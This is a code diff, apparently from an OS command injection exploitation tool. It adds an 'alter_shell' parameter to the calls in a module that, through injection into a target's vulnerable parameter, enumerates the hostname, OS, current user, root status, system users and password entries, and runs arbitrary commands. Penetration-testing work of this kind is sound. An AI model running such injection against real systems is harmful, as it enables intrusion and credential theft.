@@ -26,12 +26,12 @@ from src.core.injections.results_based.techniques.classic import cb_injector
   The "classic" technique on Result-based OS Command Injection.
 """
 
-def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter):
+def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell):
   
   # Hostname enumeration
   if menu.options.hostname:
     cmd = settings.HOSTNAME
-    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
     shell = cb_injector.injection_results(response,TAG)
     if shell:
       if menu.options.verbose:
@@ -45,13 +45,13 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
   # Retrieve system information
   if menu.options.sys_info:
     cmd = settings.RECOGNISE_OS	    
-    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
     target_os = cb_injector.injection_results(response,TAG)
     if target_os:
       target_os = "".join(str(p) for p in target_os)
       if target_os == "Linux":
 	cmd = settings.RECOGNISE_HP
-	response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+	response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
 	target_arch = cb_injector.injection_results(response,TAG)
 	if target_arch:
 	  target_arch = "".join(str(p) for p in target_arch)
@@ -65,14 +65,14 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
   # The current user enumeration
   if menu.options.current_user:
     cmd = settings.CURRENT_USER
-    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
     cu_account = cb_injector.injection_results(response,TAG)
     if cu_account:
       cu_account = "".join(str(p) for p in cu_account)
       # Check if the user have super privilleges.
       if menu.options.is_root:
 	cmd = settings.ISROOT
-	response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+	response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
 	shell = cb_injector.injection_results(response,TAG)
 	sys.stdout.write(colors.BOLD + "(!) The current user is " + colors.UNDERL + cu_account + colors.RESET)
 	if shell:
@@ -90,7 +90,7 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
   # System users enumeration
   if menu.options.users:
     cmd = settings.SYS_USERS 	    
-    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
     sys_users = cb_injector.injection_results(response,TAG)
     if sys_users :
       sys_users = "".join(str(p) for p in sys_users)
@@ -130,7 +130,7 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
   # System password enumeration
   if menu.options.passwords:
     cmd = settings.SYS_PASSES	    
-    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
     sys_passes = cb_injector.injection_results(response,TAG)
     if sys_passes :
       sys_passes = "".join(str(p) for p in sys_passes)
@@ -154,7 +154,7 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
   # Single os-shell execution
   if menu.options.os_cmd:
     cmd =  menu.options.os_cmd
-    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
+    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
     shell = cb_injector.injection_results(response,TAG)
     if shell:
       if menu.options.verbose:
